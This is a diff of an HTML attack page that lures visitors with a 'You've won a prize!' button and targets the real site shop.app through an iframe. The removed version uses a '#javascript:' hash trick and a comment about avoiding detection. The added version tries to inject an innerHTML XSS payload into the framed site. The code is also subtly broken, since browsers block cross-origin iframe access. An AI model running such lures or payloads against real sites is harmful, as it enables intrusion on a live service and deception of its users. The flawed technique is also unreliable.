@@ -1,33 +1,53 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Claim Your Prize!</title>
-</head>
 <body>
-    <h1>You've won a prize!</h1>
-    <p>Click below to claim it on Shop.app!</p>
-    <button onclick="getPrize()">Claim Your Prize</button>
+  <h1>You've won a prize!</h1>
+  <p>Click below to claim it on Shop.app!</p>
+  <button onclick="startAttack()">Claim Your Prize</button>
 
-    <iframe id="Frame" style="width: 500px; height: 500px; border: none;"></iframe> 
-    <!-- Small, not invisible, to avoid detection -->
+  <iframe id="victimFrame" style="width: 800px; height: 400px; border: 2px solid red;"></iframe>
+  <!-- Make it visible for debugging -->
 
-    <script>
-        function getPrize() {
-            const frame = document.getElementById('Frame');
-            // Craft the malicious URL for the TARGET site
-            const Hash = "#javascript:alert(1)";
-            const url = "https://shop.app/search/results?query=test123/" + Hash; 
+  <script>
+    function startAttack() {
+      const frame = document.getElementById('victimFrame');
+      // Load the target site FIRST
+      frame.src = "https://shop.app/"; // Start with a clean page
 
-            // Load the malicious URL into the iframe
-            frame.src = url;
+      frame.onload = function() {
+        // Wait for the iframe to fully load, including its JS
+        setTimeout(() => {
+          // STEP 1: Get access to the iframe's document
+          const frameDoc = frame.contentDocument || frame.contentWindow.document;
 
-            // After the iframe loads, RE-load the same URL to trigger the hashchange event
-            frame.onload = function() {
-                console.log("Iframe loaded. Triggering hash change...");
-                // Re-setting the source is the key to triggering the hashchange event
-                setTimeout(() => { frame.src = url; }, 2000);
-            };
-        }
-    </script>
+          // STEP 2: Create a new <script> element INSIDE the iframe
+          const script = frameDoc.createElement('script');
+          // STEP 3: Set the script's content to YOUR PROVEN POC CODE
+          script.textContent = `
+            // Your exact PoC code here
+            let maliciousHash = "#<img src=x onerror='alert(\\\\"XSS on: \\\\" + document.domain)'>";
+            let encodedHash = encodeURIComponent(maliciousHash.substring(1));
+            encodedHash = '#' + encodedHash;
+            console.log("What location.hash returns:", encodedHash);
+
+            try {
+              let decodedPayload = decodeURIComponent(encodedHash.substring(1));
+              console.log("After decodeURIComponent:", decodedPayload);
+
+              console.log("Testing innerHTML sink...");
+              let testDiv = document.createElement('div');
+              document.body.appendChild(testDiv);
+              testDiv.innerHTML = decodedPayload; // This should fire the alert
+
+            } catch(e) {
+              console.error("Error:", e);
+            }
+          `;
+
+          // STEP 4: Inject the script into the iframe's head/body
+          (frameDoc.head || frameDoc.documentElement).appendChild(script);
+          console.log("Injected PoC script into iframe.");
+
+        }, 2000); // Give the target site time to fully initialize
+      };
+    }
+  </script>
 </body>
-</html>
